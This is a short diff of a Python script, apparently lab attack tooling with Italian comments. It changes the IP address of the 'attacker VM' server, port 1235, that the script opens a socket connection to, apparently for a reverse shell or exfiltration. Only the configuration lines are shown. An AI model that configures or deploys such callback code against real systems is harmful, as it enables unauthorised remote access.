@@ -5,7 +5,7 @@ import sys
 import os
 
 # Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
-SERVER_IP = '192.168.1.190'
+SERVER_IP = '192.168.70.211'
 SERVER_PORT = 1235
 
 # Crea la connessione socket
